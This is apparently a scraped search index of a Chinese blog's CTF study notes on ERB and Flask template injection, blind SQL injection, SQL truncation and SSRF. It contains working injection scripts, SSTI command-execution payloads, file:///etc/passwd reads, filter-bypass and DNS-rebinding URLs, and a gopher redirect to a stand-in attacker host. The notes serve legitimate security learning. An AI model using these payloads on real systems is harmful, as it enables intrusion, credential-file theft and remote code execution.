json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)  else    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;    cookies[:auth] = auth    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)  endenddef islogin  if cookies[:auth].nil? then    redirect to(&#x27;/shop&#x27;)  endend\n\n这个代码看不懂，他们说是ruby的erb模板注入，可是我连ruby都没学过\n我们肯定是不会去学ruby的，只能简单的了解一下erb模板注入，应该和ssti注入差不多\nERB是Ruby自带的\n\n&lt;% 写逻辑脚本(Ruby语法) %&gt;\n&lt;%&#x3D; 直接输出变量值或运算结果 %&gt;\n\nrequire &#x27;erb&#x27;template = &quot;text to be generated: &lt;%= x %&gt;&quot;erb_object = ERB.new(template)x = 5puts erb_object.result(binding())x = 4puts erb_object.result(binding())\n\n\n\n如果x是可控的，跟普通模板注入一样\nrequire &#x27;erb&#x27;template = &quot;text to be generated: &lt;%= x %&gt;&quot;erb_object = ERB.new(template)x = 7*7puts erb_object.result(binding())\n\n\n\n也就是我们不要在意，和ssti一样吗\n读取一个文件：\nrequire &#x27;erb&#x27;template = &quot;text to be generated: &lt;%= x %&gt;&quot;erb_object = ERB.new(template)x = File.open(&#x27;pwd.txt&#x27;).readputs erb_object.result(binding())\n\n\n\n枚举当前类的可用方法\nrequire &#x27;erb&#x27;template = &quot;text to be generated: &lt;%= x %&gt;&quot;erb_object = ERB.new(template)x = self.methodsputs erb_object.result(binding())\n\n\n\n像ssti一样的去学注入方法肯定是不行的，尽力而为\n我们了解到&lt;%&#x3D;语法可以用来执行Ruby语句，并会尝试将结果转换为字符串，以附在最终的结果文本中。我们可以使用如下攻击载荷来尝试执行数学运算：\nruby &lt;%= 7 * 7 %&gt;\n\n\n\n我们先进行代码审计，发现主要部分是\nif params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &#x27;HS256&#x27;    cookies[:auth] = auth    ERB::new(&quot;&lt;script&gt;alert(&#x27;#&#123;params[:name][0,7]&#125; working successfully!&#x27;)&lt;/script&gt;&quot;).result  end\n\n只要满足了这个ifif params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then，就会进行模板渲染。\n但是这题有长度的限制，除去&lt;%=%&gt;，就只剩下2个字符可用了。可以用ruby的预定义变量，不过确实不会ruby，学习一下师傅们的思路：使用预定义变量$&#39;\n"},{"title":"SQL注入进阶","url":"/2025/06/02/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/","content":"SQL注入进阶笔记前言SQL注入从去年到现在，尽头实在没想到是sqlmap，现在做新生赛的题目，sqlmap用不了就寄了。实在草率，之前虽然把各种方法都了解了一遍但是都不深入，遇到一些比较难的绕过和时间盲注就没办法了，由于是进阶版，一般会收录我自己用sqlmap失败的题目\n主要会结合SQL注入常用的一些注入方法和绕过方法去写，以及多收录一些注入的模板\n1.时间盲注为什么要从时间盲注开始写，这是因为New Start的SQL注入怎么这么难，看来是为了防sqlmap。难怪比赛很少出一次sql注入，一出就这么难。\n时间盲注的难度是最大的，由于要使用到sleep()进行判断，还需要根据响应时间判断结果，虽然只比布尔盲注难一点，但还是最难的。\n基于时间的盲注（Time-based Blind Injection）：攻击者在注入语句中使用延时函数或计算耗时操作，以观察应用程序对恶意查询的处理时间。通过观察响应时间的变化，攻击者可以逐渐推断数据库中的数据。页面不会返回任何报错信息\n基于时间的盲注通常会使用一些可能引起延迟或错误的操作，如睡眠函数sleep()、错误的 SQL 语句或其他耗时的操作。\n也就是说时间盲注是在页面没有像布尔盲注那样的对错界面，也不会返回报错信息，纯靠代码执行去延时判断，至今为止我还没接触到的除sleep()以外的\n直接上题目吧\n[NewStarCTF 2023 公开赛道]midsql\n这个题目就是典型的sql盲注，我们直接尝试注入从随便输入什么都只有两个回显，一个是被过滤的回显\n\n\n另一个则是正常回显\n\n\n于是直接锁定目标为时间盲注，尝试发现只有空格被过滤了，我们直接注释绕过即可\n1/**/and/**/sleep(5)#\n\n发现真的加载了5秒才跳转\n\n\n搞清楚怎么注入的话就可以直接抄大佬的脚本并学习了\nimport timeimport requestsurl = &#x27;http://7c8af000-0d19-46ad-a058-9ab6ac370183.node5.buuoj.cn:81/?id=&#x27;database_name = &quot;&quot;for i in range(1, 100):    left = 32    right = 128#ascii码 32到128为所有包括空格等的可见字符    mid = (left + right) // 2#使用二分法缩短时间，也可以直接暴力遍历    while left &lt; right:        payload = url + f&quot;1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)#&quot;        #这里使用的是直接查询 也可以使用select查询where regexp进行正则匹配        start_time = time.time()#返回当前时间的时间戳（浮点数，单位：秒        response = requests.get(payload).text#进行请求并拿到回显会执行完sleep        end_time = time.time()#再记录下结束的时间        use_time = end_time - start_time#最后计算时间差        if use_time &gt; 2:            left = mid + 1        else:            right = mid        mid = (left + right) // 2 #自己对于二分法理解不够透彻 之前自己想换一种写法结果失败了 还是死记吧    #print(mid)    database_name += chr(mid)    print(database_name)\n\n这个脚本并没有什么特殊的绕过，只是将空格换成了注释符，很适合作为模板\n最后面再放一个其他时间盲注的脚本  用regexp就不需要使用二分法\nimport requestsurl=&#x27;http://gz.imxbt.cn:20489/`&#x27;flagstr=&#x27;&#123;abcdefghijklmnopqrstuvwxyz-1234567890&#125;&#x27;flag=&#x27;&#x27;for i in range(1,50):    for j in flagstr:        data=&#123;            &#x27;sql&#x27;:&quot;delete from flag where data regexp(&#x27;&#123;&#125;&#x27;) and sleep(3)&quot;.format(flag+j)        &#125;#sql语句利用and的特性，如果前面返回0则不会执行后面的语句        try:            response = requests.get(url, params=data, timeout=3)#timeout=3 当访问时间超过3秒报错进入except        except:            print(flag)            flag=flag+j            break\n\n\n\n2.sql约束攻击这个以前做题目的时候就遇到了，但是又忘记了，结果做一个新生赛的题目都不会，我们先来看题目代码来源于CTFshow 假赛生\n&lt;?phpsession_start();include(&#x27;config.php&#x27;);if(empty($_SESSION[&#x27;name&#x27;]))&#123;    show_source(&quot;index.php&quot;);&#125;else&#123;    $name=$_SESSION[&#x27;name&#x27;];//这个应该是用于获取登录名    $sql=&#x27;select pass from user where name=&quot;&#x27;.$name.&#x27;&quot;&#x27;;    echo $sql.&quot;&lt;br /&gt;&quot;;    system(&#x27;4rfvbgt56yhn.sh&#x27;);    $query=mysqli_query($conn,$sql);    $result=mysqli_fetch_assoc($query);    if($name===&#x27;admin&#x27;)&#123;//我们的登录名必须是admin        echo &quot;admin!!!!!&quot;.&quot;&lt;br /&gt;&quot;;        if(isset($_GET[&#x27;c&#x27;]))&#123;            preg_replace_callback(&quot;/\\w\\W*/&quot;,function()&#123;die(&quot;not allowed!&quot;);&#125;,$_GET[&#x27;c&#x27;],1);//只要参数c不被这个正则匹配到就可以拿到flag            echo $flag;        &#125;else&#123;            echo &quot;you not admin&quot;;        &#125;    &#125;&#125;?&gt;\n\n这个代码一开始我都不知道在考什么，一开始看到的是没有过滤的sql语句，以为是sql注入，但是又发现不回显结果，那个name参数也不好控制，后面还可以输出flag，那估计就不是考正常的注入\n题目提示我们又register.php和login.php去用来登录注册，尝试了一下登录和注册界面都是不能直接进行sql注入的，那就想到了二次注入\n但是普通的二次注入因为后面还有一个判读登录名，于是登录名必须是admin，这个时候就使用到了sql约束攻击了\n在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。例如如下代码：\nSELECT userId from user where username = &#x27;test            &#x27;\n\n上述代码和username &#x3D; ‘test’结果是一样的。但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。\n在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅插入字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“testName”时，实际上只能插入字符串的前5个字符，即“testN”。\n也就是说我们在进行insert语句的时候会将空格写入，但是在进行select语句的时候会将比较的两个数据将短的那个字符串用空格补齐，导致在insert的时候两个字符串不一致然后又在select查询的时候匹配成功\n我们先在register.php中注册一个账号，admin后面随便更几个空格\nadmin    //记得跟括号123\n\n然后再到login.php中去登录账号\nadmin//登录的时候使用admin123\n\n成功登录也就意味着sql约束成功了，于是我们就需要绕过这个正则\n preg_replace_callback(&quot;/\\w\\W*/&quot;,function()&#123;die(&quot;not allowed!&quot;);&#125;,$_GET[&#x27;c&#x27;],1);//只要参数c不被这个正则匹配到就可以拿到flag            echo $flag;//preg_replace_callback 会对每个被匹配到的值使用回调函数\n\n然后再使用我的新正则解释工具来解释一下这个正则\n\n\n也就是说这个匹配的是由一个文字字符开头然后后面接非文字字符，也就是说我们不能出现文字字符即可\n\n\n不知道为什么有些题解那么纠结空格，空格也会被第二个匹配到好吧\n\n"},{"title":"SSRF","url":"/2025/03/17/SSRF/","content":"SSRF漏洞笔记前言虽然现在可以在buu上一直做题了，但还是需要学一些新的东西，还有就是要跟上其他人的进度，我可不想被优化\n1.SSRF漏洞简介SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。\n一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\n比如我们可以通过百度识图等可以访问的服务器，发送给它一个恶意url，它将这个恶意url发给其内网的某台服务器，以达成攻击目的\n漏洞形成原理\nSSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。\n\n\n比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器\n2.产生SSRF漏洞的函数SSRF攻击可能存在任何语言编写的应用，接下来将举例php中可能存在SSRF漏洞的函数。\n1.file_get_contents:下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。\n&lt;?phpif (isset($_POST[&#x27;url&#x27;])) &#123; $content = file_get_contents($_POST[&#x27;url&#x27;]); $filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;; file_put_contents($filename, $content); echo $_POST[&#x27;url&#x27;]; $img = &quot;&lt;img src=\\&quot;&quot;.$filename.&quot;\\&quot;/&gt;&quot;; &#125; echo $img; ?&gt;\n\n\n\n2.sockopen():以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据\n&lt;?php function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo &quot;$errstr (error number $errno) \\n&quot;; &#125; else &#123; $out = &quot;GET $link HTTP/1.1\\r\\n&quot;; $out .= &quot;Host: $host\\r\\n&quot;; $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;; $out .= &quot;\\r\\n&quot;; fwrite($fp, $out); $contents=&#x27;&#x27;; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125;?&gt;\n\n3.curl_exec():cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。\n&lt;?php if (isset($_POST[&#x27;url&#x27;]))&#123;$link = $_POST[&#x27;url&#x27;];$curlobj = curl_init();curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($curlobj);curl_close($curlobj); $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;file_put_contents($filename, $result); echo $result;&#125;?&gt;\n\n注意事项\n一般情况下PHP不会开启fopen的gopher wrapperfile_get_contents的gopher协议不能URL编码file_get_contents关于Gopher的302跳转会出现bug，导致利用失败curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用curl_exec() 默认不跟踪跳转，file_get_contents() file_get_contents支持php://input协议\n\n\n\n3.使用到的url协议当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议\nfile:/// 从文件系统中获取文件内容，如，file:///etc/passwddict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：sftp:// SSH文件传输协议或安全文件传输协议ldap:// 轻量级目录访问协议tftp:// 简单文件传输协议gopher:// 分布式文档传递服务，可使用gopherus生成payload\n\n\n\n1.file:&#x2F;&#x2F;协议 寻找主机我们之前学php时接触到了file伪协议，顾名思义那是个伪造的，于是真的file协议来了。区别在于php伪协议前面有php:&#x2F;&#x2F;file。而file协议则是，file:&#x2F;&#x2F;\nfile协议的作用\nFile协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样。\n格式\nfile:&#x2F;&#x2F;机器的IP地址&#x2F;目录&#x2F;文件，例如要打开D盘images文件夹中的111.png文件，那么可以在资源管理器或IE地址栏中键入file:&#x2F;&#x2F;D:&#x2F;images&#x2F;111.png 然后回车。\n注：（1）对于本地机器，机器的IP地址可变成127.0.0.1或localhost或什么也不写。\n（2）“&#x2F;”符号一个都不能少。\n相应的我们也可以通过file协议访问服务器端的各种文件\n我抄了一些常见的file协议(用于linux系统)\n//读取文件passwdfile:///etc/passwd//显示当前操作系统网卡的ipfile:///etc/hosts//显示arp缓存表(寻找内网其他主机)file:///proc/net/arp//显示当前网段路由信息file:///proc/net/fib_trie\n\n\n\n我们去别人靶场试一下\n\n\n我们访问到这样的结果，显示了两个公网ip，这表示这台服务器有两张网卡\n于是我们可以去通过SSRF漏洞去访问内网的其他主机，我们在访问的时候不需要在意使用的是什么协议，或者是否能访问，只要这台服务器在开启就会回复一个响应\n\n\n我们访问arp缓存表，虽然不知道为什么会有这些东西(估计是储存了这个网络的访问记录)，但只需要知道HW assress有回显而不全是0的服务器就存在\n我们可以通过SSRF漏洞用bp的攻击模块探测出其他存活服务器\n\n\n我们对主机号进行攻击，前面的表示网络地址和现实地址不能改动\n\n\n进行攻击，拿到的长度长的就应该是存活主机\n2.dict:&#x2F;&#x2F;协议 寻找端口\n\n我们寻找到了存活主机后就需要去寻找开启的端口号，这里我们可以使用dict协议去寻找开放端口，ftp协议也可以但效率低\n\n\n我们使用bp抓包后发送到攻击器，由于有两个地方需要进行攻击，我们需要把狙击手改为集束炸弹，原理应该就是两个攻击进行排列组合，攻击所有选项\n\n\n我们扫描后可以通过看返回数据的长短判断哪些端口是开启的\n\n\n\n\n\n\n3.http:&#x2F;&#x2F;协议 查看页面信息\n\n我们扫描页面之前都是用dirsearch扫描的，这次扫描也无非就是用字典去扫面ip或域名后面的文件\nhttp://ip/index.php我们对index.php使用各种字典进行攻击即可\n\n4.gopher:&#x2F;&#x2F; 发送POST和GET请求Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息\nhttp://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;);?&gt;evil.com:# nc -lvp 1337Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest\n\n其实其他协议的作用基本上都是传递文件内容。但gopher:&#x2F;&#x2F;协议肯定有独特的地方，那就是可以进行POST和GET请求。\n我们之前的请求都是通过url传递的，但是那样只能把请求发给SSRF漏洞主机，无法攻击到内网目标服务器，这个时候就需要gopher协议去发送这个请求\n\n\n\n\n我们在进行请求的时候，需要包含一些头部信息才能进行提交，GET和POST还不同\nGET\n\n\n也就是我们需要在提交的url中带上上面的信息\ngopher://ip:端口/_保留的头部信息(需要进行一次url编码，防止最后的回车丢失) 需要注意的是gopher不会读取第一个字符，所以需要加一个字符分开\n\n这是我们普通在输入框中输入url的形式，我们也可以抓包然后改包就行了，但是我们需要将头部信息进行两次url编码，有两次编码(分别是POST请求发送时编码，和发送到目标服务器作为url也需要一次编码)\n有一些细节还是需要注意一下的，这个东西真的很麻烦\n_GET /name.php?name=benben HTTP/1.1Host:172.250.250.4GET后面必须加空格，编码是必须把Host后面的回车加上\n\n\n\nPOST\n\n\n比GET需要的头部信息多了两个模块，content-type和content-length，以及传参方式改为POST，Content-Length决定了读取的字符数，所以需要和传递字符串一致。\n_POST /name.php HTTP/1.1Host:172.250.250.4Content-Type:application/x-www-form-urlencodedContent-Length:12name=regulus\n\n\n\n\n\n4.SSRF绕过1.环回地址绕过ip地址比如127.0.0.1中数字是由10进制表示的，在计算机中是以二进制识别的，但实际上ip可以有多种表示方法\n当对方网站过滤掉了我们的127.0.0.1时，我们可以采用进制转换的方法绕过\nhttp://127.0.0.1 二进制 没有点http://01111111.00000000.00000000.00000001十六进制和八进制前面需要加上标识符八进制http://0177.0000.0000.0001十六进制http://0x7F.0x00.0x00.0x01整数形式将整个IP地址转换为一个32位无符号整数127 * 256^3 + 0 * 256^2 + 0 * 256^1 + 1 * 256^0 = 2130706433http://2130706433\n\n我们在访问时不一定需要把127.0.0.1写全\n127.0.1127.10.0都可以充当localhost\n\n\n\n我们也可以使用域名进行绕过，我收集一些\nhttp://sudo.cc/flag.php//相当于以管理员去访问flag.php\n\nsudo\n\n默认情况下，Linux 系统中的超级用户（root）拥有最高权限，可以执行任何操作。\n普通用户的权限有限，无法执行某些系统级操作（如安装软件、修改系统配置等）。\nsudo 允许普通用户在需要时临时提升权限，执行需要超级用户权限的命令。\n\n2.302重定向绕过听力别人在那讲，好像有点懂了又好像并没有。但大概意思懂了。\n当目标服务器后端对我们输入的IP地址过滤掉内网ip的时候，我们就无法直接访问到127.0.0.1这个ip了，但是我们可以通过间接访问ip实现重定向访问\n我们可以在云服务器上部署这个php代码\n&lt;?phpheader(&#x27;Location:http://127.0.0.1/flag.php&#x27;);//实现跳转服务器本地ip          \n\n通过访问我的云服务器实现跳转到flag.php，但我不知道为什么ctfshow上面不行，是flag.php里面没有直接放flag吗，但是自己用浏览器和其他靶场就可以\n\n\n不知道为什么又可以用了\n\n\n3.DNS解析绕过这个有点难，听了几次也没明白，总之先把胜利结算画面贴出来\n\n\n这都得益于一个函数\ngethostbyname()\n这个函数把我们提供的域名解析为ipv4的地址，应该就是他们常说的dns解析\n &lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$ip = gethostbyname($x[&#x27;host&#x27;]);echo &#x27;&lt;/br&gt;&#x27;.$ip.&#x27;&lt;/br&gt;&#x27;;if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;    die(&#x27;ip!&#x27;);&#125;echo file_get_contents($_POST[&#x27;url&#x27;]);&#125;else&#123;    die(&#x27;scheme&#x27;);&#125;?&gt; \n\n这个代码拿到我们的域名并解析为ipv4，然后对我们的ip地址进行一个过滤，必须为公网ip，我们想访问127.0.0.1就需要进行一项操作\nhttps://lock.cmpxchg8b.com/rebinder.html\n\n这个网站可以将我们提供的两个ip生成一个混合域名，当我们使用gethostbyname()进行解析的时候会随机返回两个ip中的一个，我们使用\n\n\n\n\n下面的内容有点很重要，我似乎有点明白了\n\n\n我们先看这张图和代码，\n其实当我们去访问域名的url的时候也需要进行一次dns解析，那么整个过程我们就进行了两次dns解析，第一次是拿到解析ipv4去进行过滤的时候，第二次是过滤过了，然后访问url的时候进行的dns解析，\n而我们拿到flag的条件就是第一次dns解析为我们的公网ip，第二次访问时进行dns解析时解析为127.0.0.1，使我们访问flag.php。这也是为什么需要进行多次提交payload才能拿到flag\n5.ctfshow还是得做题，不然不知道干什么。\n1.352关 &lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|127.0.0/&#x27;))&#123;//过滤掉127.0.0.1$ch=curl_init($url);//启动会话，并返回句柄curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//相当于服务器访问传入url$result=curl_exec($ch);curl_close($ch);//关闭会话   echo ($result);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?&gt; hacker\n\nparse_url()\n作用：parse_url — 解析 URL，返回其组成部分\nmixed parse_url ( string $url [, int $component &#x3D; -1 ] )本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。\n参数：url：要解析的 URL。无效字符将使用 _ 来替换。\ncomponent：指定 PHP_URL_SCHEME、 PHP_URL_HOST、 PHP_URL_PORT、 PHP_URL_USER、 PHP_URL_PASS、 PHP_URL_PATH、PHP_URL_QUERY 或 PHP_URL_FRAGMENT 的其中一个来获取 URL 中指定的部分的 string。 （除了指定为PHP_URL_PORT 后，将返回一个 integer 的值）。\n对严重不合格的 URL，parse_url() 可能会返回 FALSE （CTF常用 返回值False 用于逃逸判断）\n&lt;?php$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);?&gt;Array(    [scheme] =&gt; http    [host] =&gt; hostname    [user] =&gt; username    [pass] =&gt; password    [path] =&gt; /path    [query] =&gt; arg=value    [fragment] =&gt; anchor)//就是把url的各个属性给拆开\n\n这题没有什么就是把localhost和127.0.0.1给过滤掉了，我们只需要进制绕过即可\n2.353关 &lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|127\\.0\\.|\\。/i&#x27;, $url))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?&gt; \n\n我们还是一样，使用进制绕过和域名绕过\nurl=http://sudo.cc/flag.php\n\n\n\n3.356关 &lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$host=$x[&#x27;host&#x27;];if((strlen($host)&lt;=3))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?&gt; ctfshow&#123;d7e37e06-027b-4303-90c5-3de44504b7bc&#125;\n\n这个题目限制我们长度为3，我们直接0.0绕过\nurl=http://0.0/flag.php相当于127.0.0.1\n\n4.357关 &lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$ip = gethostbyname($x[&#x27;host&#x27;]);echo &#x27;&lt;/br&gt;&#x27;.$ip.&#x27;&lt;/br&gt;&#x27;;if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;    die(&#x27;ip!&#x27;);&#125;echo file_get_contents($_POST[&#x27;url&#x27;]);&#125;else&#123;    die(&#x27;scheme&#x27;);&#125;?&gt; \n\n这一关讲dns解析绕过的时候已经讲过了，但还是写下payload\n主要思路就是去试试，当第一次解析为公网ip，访问时解析为127.0.0.1的时候就能访问到flag.php\nurl=http://7f000001.761fa804.rbndr.us/flag.php\n\n我们当然也可以使用302重定向，不知道为什么这题就可以正常用了\nurl=http://ip&#x27;di/index.php\n\n\n\n5.358关 &lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if(preg_match(&#x27;/^http:\\/\\/ctf\\..*show$/i&#x27;,$url))&#123;    echo file_get_contents($url);&#125;ctfshow&#123;326214f4-7ac7-4868-853e-3ccb272081c1&#125;\n\n这题规定我们的url必须以http://cft.开始以show结束，不会，直接上payload\nurl=http://ctf.@127.0.0.1/flag.php#showurl=http://ctf.@127.0.0.1/flag.php?show\n\n我们可以通过name@的形式进行绕过，name是用户名，@则是用户名结束的标志，\n至于其他的#show 是URL的片段部分，通常用于指向页面内的特定部分。?show则是GET传参\n","tags":["SSRF"]},{"title":"SSTI-flask-labs","url":"/2025/03/25/SSTI-flask-labs/","content":"SSTI-labs笔记前言实在草率了，没想到SSTI有点难，那些模块，子类，函数实在太多了。根本没有什么做题思路，还是得从头开始，去了解一些做题思路\n1关 调用os模块首先是一个输入框，我们不可能在输入框中查看结果，查看页面源码，发现通过POST方式去传递了code参数，我们尝试&#123;&#123;7*7&#125;&#125;，发现回显49，证明存在SSTI注入\n这次没有过滤，所以有很多种方法，我们都写一下\n#最简单的应该是popen直接命令执行，通过脚本跑出其所在子类code=&#123;&#123;().__class__.__base__.__subclasses__()[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /app/flag&#x27;).read()&#125;&#125;#我们再试下os._wrap_close子类#有点尴尬，os._wrap_close这个子类就是包含popen这个函数的子类，所以这和第一个方法一样#方法2 lipsum这个是python下面系统的一个固定函数，在其全局变量中可以找到os模块&#123;&#123;lipsum.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /app/flag&#x27;).read()&#125;&#125;#我们也可以使用config&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /app/flag&#x27;).read()&#125;&#125;#还有url_for&#123;&#123;url_for.__globals__[&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /app/flag&#x27;).read()&#125;&#125;#文件读取太简单了，算了\n\n\n\n2关 过滤大括号"},{"title":"SSTI","url":"/2025/03/23/SSTI/","content":"SSTI学习笔记前言到底是什么原因，学一个Flask竟然让我博客死机了，第一次hexo g运行失败，根本不知道怎么搞这个东西，如果实在不行背水一战把Flak笔记迁移出去试下。刚才去试了一下，果然是flask的原因，把这个文件移除博客即可\n1.漏洞原理有了以上关于Flask的基础知识，我们就可以来看看漏洞是如何产生的了。由于对用户输入过滤不严，攻击者可以通过构造恶意数据，使服务器模板引擎渲染这部分数据，从而达到读取文件、RCE等目的。\n下面，我们来看一下分析一下存在SSTI漏洞的代码和不存在漏洞的代码，对比学习，体会一下这个漏洞的原理。\n存在SSTI漏洞的代码\nfrom flask import Flask, request, render_template_stringfrom jinja2 import Templateapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    name = request.args.get(&#x27;name&#x27;, default=&#x27;guest&#x27;)    t = &#x27;&#x27;&#x27;        &lt;html&gt;            &lt;h1&gt;Hello %s&lt;/h1&gt;        &lt;/html&gt;        &#x27;&#x27;&#x27; % (name)    # 将一段字符串作为模板进行渲染    return render_template_string(t)&quot;&quot;&quot;这样的代码同样存在漏洞def index():    name = request.args.get(&#x27;name&#x27;, default=&#x27;guest&#x27;)    t = Template(        &#x27;&#x27;&#x27;        &lt;html&gt;            &lt;h1&gt;Hello %s&lt;/h1&gt;        &lt;/html&gt;        &#x27;&#x27;&#x27; % name    )    # 对模板对象进行渲染    return t.render()&quot;&quot;&quot;app.run()\n\n这段代码是将用户的输入先拼接到模板中再进行渲染，我感觉就是渲染过程让我们输入的恶意代码执行了\n让我们来看下不存在漏洞的代码\nfrom flask import Flask, request, render_templateapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index():    name = request.args.get(&#x27;name&#x27;, default=&#x27;guest&#x27;)    #     return render_template(&#x27;index.html&#x27;, name=name)app.run()\n\n通过观察以上代码，我们可以发现漏洞出现的原因：服务器端将用户可控的输入直接拼接到模板中进行渲染，导致漏洞出现。反之，要解决该漏洞，则只需先将模板渲染，再拼接字符串。\n深入到Flask渲染函数原理来讲，render和render_template_string由用户拼接，字符串不会自动转义，而render_template会对字符串计进行自动转义，因此避免了参数被作为表达式执行。\n2.漏洞利用思路利用思路\n这里以通过SSTI进行RCE为例，基本的利用思路为：\n\n随便找个倒霉的内置类：[]、””\n通过这个类获取到object类：base__、__bases__、__mro\n通过object类获取所有子类：subclasses()\n在子类列表中找到可以利用的类\n直接调用类下面函数或使用该类空间下可用的其他模块的函数\n\n魔术方法\n为此，我们需要用到以下魔术方法：\n\n\n\n魔术方法\n作用\n\n\n\n_init_\n对象的初始化方法\n\n\n_class_\n返回对象所属的类\n\n\n_module_\n返回类所在的模块\n\n\n_mro_\n返回类的调用顺序，可以此找到其父类（用于找父类）\n\n\n_base_\n获取类的直接父类（用于找父类）\n\n\n_bases_\n获取父类的元组，按它们出现的先后排序（用于找父类）\n\n\n_dict_\n返回当前类的函数、属性、全局变量等\n\n\n_subclasse